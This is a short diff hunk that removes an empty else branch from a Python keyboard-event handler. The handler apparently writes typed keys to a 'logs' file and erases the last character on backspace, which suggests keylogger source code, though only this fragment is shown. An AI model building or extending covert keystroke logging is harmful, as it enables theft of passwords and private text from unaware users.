@@ -57,8 +57,6 @@ def _event(event):
         elif event.Ascii == 8:
             logs.seek(-1, 1)
             logs.truncate()
-        else:
-            pass
     except Exception as e:
         print('{} error: {}'.format(event.__name__, str(e)))
     return True
